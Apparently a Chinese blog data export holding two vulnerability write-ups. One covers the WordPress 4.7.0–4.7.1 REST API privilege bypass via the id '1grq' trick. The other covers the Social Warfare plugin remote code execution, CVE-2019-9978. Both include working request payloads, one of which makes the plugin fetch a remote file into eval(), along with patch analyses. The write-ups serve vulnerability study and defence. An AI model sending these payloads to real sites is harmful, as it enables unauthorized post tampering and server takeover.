post信息。</p>\n<p>这个漏洞的挑战就在于，如何成功的绕过update_item_permissions_check()模块，使其最终return true。</p>\n<p>我们回头看update_item_permissions_check()函数，</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/02/5b666100fc09a0a4a7e0f09447e0e807.png\"></p>\n<p>注意到$post = get_post( $request[‘id’] );这一行，这一行的作用是判断提交的文章id是否存在。</p>\n<pre class=\"lang:default decode:true \">function get_post( $post = null, $output = OBJECT, $filter = 'raw' ) {\n   if ( empty( $post ) &amp;&amp; isset( $GLOBALS['post'] ) )\n      $post = $GLOBALS['post'];\n\n   if ( $post instanceof WP_Post ) {\n      $_post = $post;\n   } elseif ( is_object( $post ) ) {\n      if ( empty( $post-&gt;filter ) ) {\n         $_post = sanitize_post( $post, 'raw' );\n         $_post = new WP_Post( $_post );\n      } elseif ( 'raw' == $post-&gt;filter ) {\n         $_post = new WP_Post( $post );\n      } else {\n         $_post = WP_Post::get_instance( $post-&gt;ID );\n      }\n   } else {\n      $_post = WP_Post::get_instance( $post );\n   }\n\n   if ( ! $_post )\n      return null;\n\n   $_post = $_post-&gt;filter( $filter );\n\n   if ( $output == ARRAY_A )\n      return $_post-&gt;to_array();\n   elseif ( $output == ARRAY_N )\n      return array_values( $_post-&gt;to_array() );\n\n   return $_post;\n}\n</pre>\n\n<p>可见，如果id对应的文章不存在，则返回null。</p>\n<p>如果我们输入的url是这种形式</p>\n<p><a href=\"http://192.168.3.112/wordpress/index.php/wp-json/wp/v2/posts/1/?id=1grq\">http://192.168.3.112/wordpress/index.php/wp-json/wp/v2/posts/1/?id=1grq</a></p>\n<p>get_post()函数返回值一定为null，这样会使得$post值为null，回头来看update_item_permissions_check()函数，这时update_item_permissions_check()函数的返回值竟然为true了！</p>\n<p>既然update_item_permissions_check()函数的返回值为true，说明我们绕过了update_item_permissions_check()权限验证，但是id为‘1grq’，根本不存在这样数字加字母组合的文章id，那怎么才能对指定文章进行越权操作呢？</p>\n<p>有趣的事情发生了，让我们来看update_item()函数，这个函数是用来update通过权限验证的数据，我们看看它是怎么定义的</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/02/6f07e62c711ced1616ab49bf0aa23e63.png\"></p>\n<p>注意第二行，这里将$request[‘id’]进行了int类型的数值转换，在php中，$request[‘id’] =”1grq”会被转换为数值类型1，如下图演示</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/02/2fc4a0b18c5f936a8442712acf931321.png\"></p>\n<p>所以这里的$id又由‘1grq’变回1了，get_post()函数也会找到对应id为1的文章了。</p>\n<p><strong>漏洞利用</strong></p>\n<p>目前已经有研究员在GitHub上给出相应的poc，链接如下</p>\n<p><a href=\"https://gist.github.com/leonjza/2244eb15510a0687ed93160c623762ab\">https://gist.github.com/leonjza/2244eb15510a0687ed93160c623762ab</a></p>\n<p><strong>官方修补方案分析</strong></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/02/687871c5f29c5e5a8ae2f59d588c441c.png\"></p>\n<p>在4.7.2版本中，如果get_post()判定$post结果为 false，则直接返回$post，避免$post进入下层if判定绕过权限检查。</p>\n<p><strong>修补防御</strong></p>\n<p>升级wordpress至最新版本（4.7.2）。</p>\n<h3 id=\"关于绿盟科技\"><a href=\"#关于绿盟科技\" class=\"headerlink\" title=\"关于绿盟科技\"></a><strong>关于绿盟科技</strong></h3><p>北京神州绿盟信息安全科技股份有限公司（简称绿盟科技）成立于2000年4月，总部位于北京。在国内外设有30多个分支机构，为政府、运营商、金融、能源、互联网以及教育、医疗等行业用户，提供具有核心竞争力的安全产品及解决方案，帮助客户实现业务的安全顺畅运行。</p>\n<p>基于多年的安全攻防研究，绿盟科技在网络及终端安全、互联网基础安全、合规及安全管理等领域，为客户提供入侵检测/防护、抗拒绝服务攻击、远程安全评估以及Web安全防护等产品以及专业安全服务。</p>\n<p>北京神州绿盟信息安全科技股份有限公司于2014年1月29日起在深圳证券交易所创业板上市交易，股票简称：绿盟科技，股票代码：300369。</p>\n<p>如果您需要了解更多内容，可以<br>加入QQ群：570982169<br>直接询问：010-68438880</p>\n<div id=\"page\" class=\"hfeed site\"></div>","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/看见到洞见之楔子.jpg","excerpt":"<p>WordPress是一种使用PHP语言开发的博客平台，用户可以在支持PHP和MySQL数据库的服务器上架设属于自己的网站。也可以把 WordPress当作一个内容管理系统来使用。","more":"</p>\n<p>WordPress 在4.7.0版本之后将REST API插件集成到默认功能之中。REST API为WordPress的使用者提供了一个方便快捷的管理接口。在WordPress 4.7.0-4.7.1版本中,存在着一个越权漏洞，成功的利用这个漏洞，可以绕过管理员权限对文章进行增删改查操作。</p>\n<h2 id=\"影响版本\"><a href=\"#影响版本\" class=\"headerlink\" title=\"影响版本\"></a>影响版本</h2><p>WordPress 4.7.0-4.7.1</p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>在正式的漏洞分析开始前，先来简单介绍下REST API的使用。官网给出的介绍如下</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/02/c095f00fa1cc64abde17d4bbeb44f5a1.png\"></p>\n<p>具体使用详情请参照REST API Handbook</p>\n<p><a href=\"https://developer.wordpress.org/rest-api/\">https://developer.wordpress.org/rest-api/</a></p>\n<p>在使用api对文章进行操作之前，需要对操作进行授权，授权方式有三种：cookie、oauth和简单认证。如果不进行授权直接通过api对文章进行修改操作，会返回一个401，如下图所示</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/02/c095f00fa1cc64abde17d4bbeb44f5a1.png\"></p>\n<p>如果想成功利用漏洞，必须绕过权限管理。我们跟踪下后台update处权限管理代码</p>\n<pre class=\"lang:default decode:true \">public function update_item_permissions_check( $request ) {\n\n   $post = get_post( $request['id'] );\n   $post_type = get_post_type_object( $this-&gt;post_type );\n\n   if ( $post &amp;&amp; ! $this-&gt;check_update_permission( $post ) ) {\n      return new WP_Error( 'rest_cannot_edit', __( 'Sorry, you are not allowed to edit this post.' ), array( 'status' =&gt; rest_authorization_required_code() ) );\n   }\n\n   if ( ! empty( $request['author'] ) &amp;&amp; get_current_user_id() !== $request['author'] &amp;&amp; ! current_user_can( $post_type-&gt;cap-&gt;edit_others_posts ) ) {\n      return new WP_Error( 'rest_cannot_edit_others', __( 'Sorry, you are not allowed to update posts as this user.' ), array( 'status' =&gt; rest_authorization_required_code() ) );\n   }\n\n   if ( ! empty( $request['sticky'] ) &amp;&amp; ! current_user_can( $post_type-&gt;cap-&gt;edit_others_posts ) ) {\n      return new WP_Error( 'rest_cannot_assign_sticky', __( 'Sorry, you are not allowed to make posts sticky.' ), array( 'status' =&gt; rest_authorization_required_code() ) );\n   }\n\n   if ( ! $this-&gt;check_assign_terms_permission( $request ) ) {\n      return new WP_Error( 'rest_cannot_assign_term', __( 'Sorry, you are not allowed to assign the provided terms.' ), array( 'status' =&gt; rest_authorization_required_code() ) );\n   }\n\n   return true;\n}\n</pre>\n\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/02/614b6c67791a249dd43c54954278af11.png\"></p>\n<p>如上图所示，在这里if语句中，前半部分$post为真，后半部分check_update_permission()函数对$post的权限进行判断，结果为假，导致返回Sorry, you are not allowed to edit this post信息。</p>\n<p>这个漏洞的挑战就在于，如何成功的绕过update_item_permissions_check()模块，使其最终return true。</p>\n<p>我们回头看update_item_permissions_check()函数，</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/02/5b666100fc09a0a4a7e0f09447e0e807.png\"></p>\n<p>注意到$post = get_post( $request[‘id’] );这一行，这一行的作用是判断提交的文章id是否存在。</p>\n<pre class=\"lang:default decode:true \">function get_post( $post = null, $output = OBJECT, $filter = 'raw' ) {\n   if ( empty( $post ) &amp;&amp; isset( $GLOBALS['post'] ) )\n      $post = $GLOBALS['post'];\n\n   if ( $post instanceof WP_Post ) {\n      $_post = $post;\n   } elseif ( is_object( $post ) ) {\n      if ( empty( $post-&gt;filter ) ) {\n         $_post = sanitize_post( $post, 'raw' );\n         $_post = new WP_Post( $_post );\n      } elseif ( 'raw' == $post-&gt;filter ) {\n         $_post = new WP_Post( $post );\n      } else {\n         $_post = WP_Post::get_instance( $post-&gt;ID );\n      }\n   } else {\n      $_post = WP_Post::get_instance( $post );\n   }\n\n   if ( ! $_post )\n      return null;\n\n   $_post = $_post-&gt;filter( $filter );\n\n   if ( $output == ARRAY_A )\n      return $_post-&gt;to_array();\n   elseif ( $output == ARRAY_N )\n      return array_values( $_post-&gt;to_array() );\n\n   return $_post;\n}\n</pre>\n\n<p>可见，如果id对应的文章不存在，则返回null。</p>\n<p>如果我们输入的url是这种形式</p>\n<p><a href=\"http://192.168.3.112/wordpress/index.php/wp-json/wp/v2/posts/1/?id=1grq\">http://192.168.3.112/wordpress/index.php/wp-json/wp/v2/posts/1/?id=1grq</a></p>\n<p>get_post()函数返回值一定为null，这样会使得$post值为null，回头来看update_item_permissions_check()函数，这时update_item_permissions_check()函数的返回值竟然为true了！</p>\n<p>既然update_item_permissions_check()函数的返回值为true，说明我们绕过了update_item_permissions_check()权限验证，但是id为‘1grq’，根本不存在这样数字加字母组合的文章id，那怎么才能对指定文章进行越权操作呢？</p>\n<p>有趣的事情发生了，让我们来看update_item()函数，这个函数是用来update通过权限验证的数据，我们看看它是怎么定义的</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/02/6f07e62c711ced1616ab49bf0aa23e63.png\"></p>\n<p>注意第二行，这里将$request[‘id’]进行了int类型的数值转换，在php中，$request[‘id’] =”1grq”会被转换为数值类型1，如下图演示</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/02/2fc4a0b18c5f936a8442712acf931321.png\"></p>\n<p>所以这里的$id又由‘1grq’变回1了，get_post()函数也会找到对应id为1的文章了。</p>\n<p><strong>漏洞利用</strong></p>\n<p>目前已经有研究员在GitHub上给出相应的poc，链接如下</p>\n<p><a href=\"https://gist.github.com/leonjza/2244eb15510a0687ed93160c623762ab\">https://gist.github.com/leonjza/2244eb15510a0687ed93160c623762ab</a></p>\n<p><strong>官方修补方案分析</strong></p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/02/687871c5f29c5e5a8ae2f59d588c441c.png\"></p>\n<p>在4.7.2版本中，如果get_post()判定$post结果为 false，则直接返回$post，避免$post进入下层if判定绕过权限检查。</p>\n<p><strong>修补防御</strong></p>\n<p>升级wordpress至最新版本（4.7.2）。</p>\n<h3 id=\"关于绿盟科技\"><a href=\"#关于绿盟科技\" class=\"headerlink\" title=\"关于绿盟科技\"></a><strong>关于绿盟科技</strong></h3><p>北京神州绿盟信息安全科技股份有限公司（简称绿盟科技）成立于2000年4月，总部位于北京。在国内外设有30多个分支机构，为政府、运营商、金融、能源、互联网以及教育、医疗等行业用户，提供具有核心竞争力的安全产品及解决方案，帮助客户实现业务的安全顺畅运行。</p>\n<p>基于多年的安全攻防研究，绿盟科技在网络及终端安全、互联网基础安全、合规及安全管理等领域，为客户提供入侵检测/防护、抗拒绝服务攻击、远程安全评估以及Web安全防护等产品以及专业安全服务。</p>\n<p>北京神州绿盟信息安全科技股份有限公司于2014年1月29日起在深圳证券交易所创业板上市交易，股票简称：绿盟科技，股票代码：300369。</p>\n<p>如果您需要了解更多内容，可以<br>加入QQ群：570982169<br>直接询问：010-68438880</p>\n<div id=\"page\" class=\"hfeed site\"></div>"},{"title":"WordPress-Social-Warfare远程代码执行漏洞分析","date":"2019-05-16T09:49:58.000Z","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\n------\n\n<div align=\"center\">{% asset_img 1.png%}</div>\n\nsocial-warfare是一款 WordPress社交分享按钮插件。 该插件被wordpress用户广泛的应用： 从官网看，该插件官方的统计是超过90万的下载量\n\nsocial-warfare &lt;= 3.5.2版本中，程序没有对传入参数进行严格控制以及过滤，导致攻击者可构造恶意payload，无需后台权限，直接造成远程命令执行漏洞\n\n<!--more-->\n\n# 背景介绍\n\nsocial-warfare是一款 WordPress社交分享按钮插件。 不同于大多数WordPress社交分享插件，social-warfar最大的优势在于其轻便性与高效性。它不会像其他共享插件一样减慢网站速度，这也是很多用户使用其作为自己网站社交分享插件的原因。\n\n该插件被wordpress用户广泛的应用： 从官网看，该插件官方的统计是超过90万的下载量\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/9cab96ac7dc5a8c199faa4cea800d35b.png)\n\n## 漏洞描述\n\nsocial-warfare &lt;= 3.5.2版本中，程序没有对传入参数进行严格控制以及过滤，导致攻击者可构造恶意payload，无需后台权限，直接造成远程命令执行漏洞。\n\n攻击成功的条件只需要如下两条：\n\n只要符合以上两个条件，无需复杂的payload构造，即可通过简简单单的一个get请求，远程执行任意代码。\n与wordpress自身漏洞修补不同，对于插件的漏洞，wordpress并不会在后台对该插件进行自动升级，仅仅是提示有新版本可用。\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/f09cfb9a4bf7ca3a89624bbdab4ece3a.png)\n\n简言之，由于该机制的存在，目前还有大部分使用该插件的站长，所使用着仍存在漏洞版本的social-warfare插件，面临着被攻击的风险。\n\n与此同时，这个漏洞，还是一个洞中洞，开发者的一连串失误，将该漏洞威胁等级逐步增高。\n\n&nbsp;\n\n## 受影响的系统版本\n\nsocial-warfare&lt;= 3.5.2\n\n&nbsp;\n\n## 漏洞编号\n\nCVE-2019-9978\n\n&nbsp;\n\n# 漏洞细节\n\nsocial-warfare安装后如下图\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/6cea63341fcc7d1afae9189460553fb4.png)\n\n如图中红框所见，该插件提供了一个简洁易用的分享功能栏。\n\n首先，通过github的commit记录，找到漏洞触发点\n\n漏洞触发点位于/wp-content/plugins/social-warfare-3.5.2/lib/utilities/SWP_Database_Migration.php中的debug_parameters方法中\n\n首先分析下debug_parameters方法\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/9a7ba07b0bc7379abc39d0dc734bef4d.png)\n\n该方法提供了一种允许更容易调试数据库迁移功能的方法。\n\n先来看下get_user_options功能的代码块\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/4e04fc9b7265e54c0e15a3635fc5874b.png)\n\n此处功能模块加载wp-content/plugins/social-warfare-3.5.2/lib/utilities/SWP_Database_Migration.php 中initialize_database方法中的$defaults数组中的配置信息，如下图\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/19b94966c0e303f8164286461e0338e2.png)\n\n在访问与执行该功能模块后，返回相应的配置信息\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/fcd76e490cc82b1d1ca222c7fc4727b7.png)\n\n接下来分析漏洞触发点 位于如下图中的if分支中\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/34a240e81557704f1c9745d6080e23ad.png)\n\n也就是在’load_options’这个功能模块中。该功能模块，是开发者用来调试数据库迁移功能的，在对用户实现实际的业务功能中，该模块并没有被使用过。\n\n逐行分析下此功能模块 首先，可以看到如下图代码块:\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/9a74d7ee9fd35b14d8f9ef267f87fd38.png)\n\n如红框中所见，这里的代码看起来，需要通过is_admin()方法的校验。看起来，这里需要有admin权限才可以执行后续代码触发漏洞。按照以往经验，这是一个需要后台权限才可以代码执行的漏洞（但这里的推测并不正确，具体的见下文分析）\n\n紧接着，通过file_get_contents方法，发送请求\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/17cbe28ee96c48c8baab35742002bf3d.png)\n\n其中的$_GET[‘swp_url’]我们可控，例如：\n\nhttp://127.0.0\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/0594cb2ffa6f8a291c0ba8d41e1e5668.png)\n\n这样file_get_contents会访问 http://127.0.0.1/1.php?swp_debug=get_user_options，并将我们构造好的payload传递给$options变量 到此为止，我们通过构造链接传入file_get_contents，达到完全可控$options变量中的内容的目的\n\n接下来，会从$options变量中提取出内容，并进行解析，如下图\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/bded25e5da4ccfa0f16d614b52548839.png)\n\n随后，将解析出的$options值拼接后赋予$array，如使用我们案例中的1.php,那么$array的值为：return phpinfo()\n\n接下来，$array中的值会传递入eval中，造成代码执行\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/dd061c81db5e40245e4458ff5f8bc8ba.png)\n\n实际效果如下图\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/66a4b42781354e24b2cde9e630f51bb1.png)\n\n漏洞分析到此结束，本次漏洞影响很大，但漏洞自身没有什么亮点\n\n接下来，看一下官方是如何修补的：\n\n通过github的commit记录，获取此次的修补方案。\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/a134e944bfa46ae34edb4d687d33f597.png)\n\n此次修补，将lib/utilities/SWP_Database_Migration.php中的221-284行，将debug_parameters方法中存在问题的load_options模块代码全部删除 所以不存在绕过补丁的可能性。\n\n在分析此漏洞时，有几处有意思的地方，和大家分享一下：\n\n### 思考一：\n\n先来看下如下操作：\n\n首先，我们退出wordpress登陆\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/0dba144a1bc952bc4cda36f0cce39b6c.png)\n\n可见，此时我们并没有登陆，也没有admin权限\n\n接着，我们访问poc\n\nhttp://127.0.0.1/wordpress/wp-admin/admin-post.php?swp_debug=load_options&amp;swp_url=http://127.0.0.1/1.php\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/650252922e64b757e1d7c89b063cc305.png)\n\npayload仍然可以触发\n\n回顾上文此处\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/9a74d7ee9fd35b14d8f9ef267f87fd38.png)\n\n在漏洞分析环节，我们的猜测是，由于is_admin方法的校验，此处应该是后台漏洞，但是在没有登陆的情况下，仍然触发了。\n\n这是为什么呢？\n\n原因如下： 先来看看is_admin方法是如何实现的\n\n位于/wp-includes/load.php中\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/de06cb5281ce8f86eff50fab3c185a22.png)\n\n可以看到，有一个if-elseif判断\n\n在elseif中判断defined (‘WP_ADMIN’)的值\n\n由于我们构造的payload，入口是admin-post.php\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/0fed2e5c53e4edde5b9d93f2048793d6.png)\n\n看一下admin-post.php 第3行将WP_ADMIN定义为true\n\n也就是说，is_admin方法，检查的是：此时运行时常量WP_ADMIN的值是否为true。\n\n在wordpress中，WP_ADMIN只是用来标识该文件是否为后台文件。大多数后台文件，都会在脚本中定义WP_ADMIN为true(例如wp-admin目录下的admin-post.php等)， 因此is_admin方法检测通过时，只能说明此是通过后台文件作为入口，调用debug_parameters方法，并不能有效的验证此时访问者的身份是否是admin\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/33f902eec67376c6d25e3d0dd6a9fb5f.png)\n\n前台index.php无法触发\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/f4c0cca46dd5d5fc3b030c0551588024.png)\n\nwp-admin目录下的about.php可以触发\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/2cc7e92daa9871394958530b342e44df.png)\n\n可见，wp-admin下任意文件为入口，都可以触发该漏洞，也就是说，在构造payload以及进行防护时，需要注意\n\nhttp://127.0.0.1/wordpress/wp-admin/[xxx].php?swp_debug=load_options&amp;swp_url=http://127.0.0.1/1.php\n\n这里xxx可以是绝大多数后台php文件\n\n### 思考二：\n\n访问http://127.0.0.1/wordpress/index.php?swp_debug=get_user_options 时，是如何将get请求中的swp_debug=get_user_options与get_user_options功能模块关联起来，调用此功能模块执行相应的功能呢？\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/c63a5db2ef1357c6fb1c0c176eb5195f.png)\n\n同理，当访问http://127.0.0.1/wordpress/index.php?swp_debug=load_options 时，后台是如何解析get请求，并找到load_options模块的？\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/9d224e3ea0e9aff4641c2f37250366e1.png)\n\n开始的时候，笔者以为是有相关的路由配置(类似于django中的url解析)，或者说是类似MVC结构中的控制器（类似thinkphp中的url普通模式http://localhost/?m=home&amp;c=user&amp;a=login&amp;var=value）这样的结构，但实际真相很简单：\n\n见下图，SWP_Utility::debug方法\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/d8e014b47e8d8c511fb6f6ef359efe43.png)\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/f416a39a73e5de93a96b836bf844b57a.png)\n\n在debug_parameters方法中的所有if分支中逐个执行debug方法，逐个将debug方法内注册的值（’load_options’、’get_user_options’等）和get请求中swp_debug的值进行比较，如果一样，则执行该功能模块的代码，如果不一样，则进入下个if中。道理同等于switch\n","source":"_posts/WordPress-Social-Warfare-Rce.md","raw":"---\ntitle: WordPress-Social-Warfare远程代码执行漏洞分析\ndate: 2019-05-16 17:49:58\ntags: web漏洞分析\ncategories: 技术\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\n------\n\n<div align=\"center\">{% asset_img 1.png%}</div>\n\nsocial-warfare是一款 WordPress社交分享按钮插件。 该插件被wordpress用户广泛的应用： 从官网看，该插件官方的统计是超过90万的下载量\n\nsocial-warfare &lt;= 3.5.2版本中，程序没有对传入参数进行严格控制以及过滤，导致攻击者可构造恶意payload，无需后台权限，直接造成远程命令执行漏洞\n\n<!--more-->\n\n# 背景介绍\n\nsocial-warfare是一款 WordPress社交分享按钮插件。 不同于大多数WordPress社交分享插件，social-warfar最大的优势在于其轻便性与高效性。它不会像其他共享插件一样减慢网站速度，这也是很多用户使用其作为自己网站社交分享插件的原因。\n\n该插件被wordpress用户广泛的应用： 从官网看，该插件官方的统计是超过90万的下载量\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/9cab96ac7dc5a8c199faa4cea800d35b.png)\n\n## 漏洞描述\n\nsocial-warfare &lt;= 3.5.2版本中，程序没有对传入参数进行严格控制以及过滤，导致攻击者可构造恶意payload，无需后台权限，直接造成远程命令执行漏洞。\n\n攻击成功的条件只需要如下两条：\n\n只要符合以上两个条件，无需复杂的payload构造，即可通过简简单单的一个get请求，远程执行任意代码。\n与wordpress自身漏洞修补不同，对于插件的漏洞，wordpress并不会在后台对该插件进行自动升级，仅仅是提示有新版本可用。\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/f09cfb9a4bf7ca3a89624bbdab4ece3a.png)\n\n简言之，由于该机制的存在，目前还有大部分使用该插件的站长，所使用着仍存在漏洞版本的social-warfare插件，面临着被攻击的风险。\n\n与此同时，这个漏洞，还是一个洞中洞，开发者的一连串失误，将该漏洞威胁等级逐步增高。\n\n&nbsp;\n\n## 受影响的系统版本\n\nsocial-warfare&lt;= 3.5.2\n\n&nbsp;\n\n## 漏洞编号\n\nCVE-2019-9978\n\n&nbsp;\n\n# 漏洞细节\n\nsocial-warfare安装后如下图\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/6cea63341fcc7d1afae9189460553fb4.png)\n\n如图中红框所见，该插件提供了一个简洁易用的分享功能栏。\n\n首先，通过github的commit记录，找到漏洞触发点\n\n漏洞触发点位于/wp-content/plugins/social-warfare-3.5.2/lib/utilities/SWP_Database_Migration.php中的debug_parameters方法中\n\n首先分析下debug_parameters方法\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/9a7ba07b0bc7379abc39d0dc734bef4d.png)\n\n该方法提供了一种允许更容易调试数据库迁移功能的方法。\n\n先来看下get_user_options功能的代码块\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/4e04fc9b7265e54c0e15a3635fc5874b.png)\n\n此处功能模块加载wp-content/plugins/social-warfare-3.5.2/lib/utilities/SWP_Database_Migration.php 中initialize_database方法中的$defaults数组中的配置信息，如下图\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/19b94966c0e303f8164286461e0338e2.png)\n\n在访问与执行该功能模块后，返回相应的配置信息\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/fcd76e490cc82b1d1ca222c7fc4727b7.png)\n\n接下来分析漏洞触发点 位于如下图中的if分支中\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/34a240e81557704f1c9745d6080e23ad.png)\n\n也就是在’load_options’这个功能模块中。该功能模块，是开发者用来调试数据库迁移功能的，在对用户实现实际的业务功能中，该模块并没有被使用过。\n\n逐行分析下此功能模块 首先，可以看到如下图代码块:\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/9a74d7ee9fd35b14d8f9ef267f87fd38.png)\n\n如红框中所见，这里的代码看起来，需要通过is_admin()方法的校验。看起来，这里需要有admin权限才可以执行后续代码触发漏洞。按照以往经验，这是一个需要后台权限才可以代码执行的漏洞（但这里的推测并不正确，具体的见下文分析）\n\n紧接着，通过file_get_contents方法，发送请求\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/17cbe28ee96c48c8baab35742002bf3d.png)\n\n其中的$_GET[‘swp_url’]我们可控，例如：\n\nhttp://127.0.0\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/0594cb2ffa6f8a291c0ba8d41e1e5668.png)\n\n这样file_get_contents会访问 http://127.0.0.1/1.php?swp_debug=get_user_options，并将我们构造好的payload传递给$options变量 到此为止，我们通过构造链接传入file_get_contents，达到完全可控$options变量中的内容的目的\n\n接下来，会从$options变量中提取出内容，并进行解析，如下图\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/bded25e5da4ccfa0f16d614b52548839.png)\n\n随后，将解析出的$options值拼接后赋予$array，如使用我们案例中的1.php,那么$array的值为：return phpinfo()\n\n接下来，$array中的值会传递入eval中，造成代码执行\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/dd061c81db5e40245e4458ff5f8bc8ba.png)\n\n实际效果如下图\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/66a4b42781354e24b2cde9e630f51bb1.png)\n\n漏洞分析到此结束，本次漏洞影响很大，但漏洞自身没有什么亮点\n\n接下来，看一下官方是如何修补的：\n\n通过github的commit记录，获取此次的修补方案。\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/a134e944bfa46ae34edb4d687d33f597.png)\n\n此次修补，将lib/utilities/SWP_Database_Migration.php中的221-284行，将debug_parameters方法中存在问题的load_options模块代码全部删除 所以不存在绕过补丁的可能性。\n\n在分析此漏洞时，有几处有意思的地方，和大家分享一下：\n\n### 思考一：\n\n先来看下如下操作：\n\n首先，我们退出wordpress登陆\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/0dba144a1bc952bc4cda36f0cce39b6c.png)\n\n可见，此时我们并没有登陆，也没有admin权限\n\n接着，我们访问poc\n\nhttp://127.0.0.1/wordpress/wp-admin/admin-post.php?swp_debug=load_options&amp;swp_url=http://127.0.0.1/1.php\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/650252922e64b757e1d7c89b063cc305.png)\n\npayload仍然可以触发\n\n回顾上文此处\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/9a74d7ee9fd35b14d8f9ef267f87fd38.png)\n\n在漏洞分析环节，我们的猜测是，由于is_admin方法的校验，此处应该是后台漏洞，但是在没有登陆的情况下，仍然触发了。\n\n这是为什么呢？\n\n原因如下： 先来看看is_admin方法是如何实现的\n\n位于/wp-includes/load.php中\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/de06cb5281ce8f86eff50fab3c185a22.png)\n\n可以看到，有一个if-elseif判断\n\n在elseif中判断defined (‘WP_ADMIN’)的值\n\n由于我们构造的payload，入口是admin-post.php\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/0fed2e5c53e4edde5b9d93f2048793d6.png)\n\n看一下admin-post.php 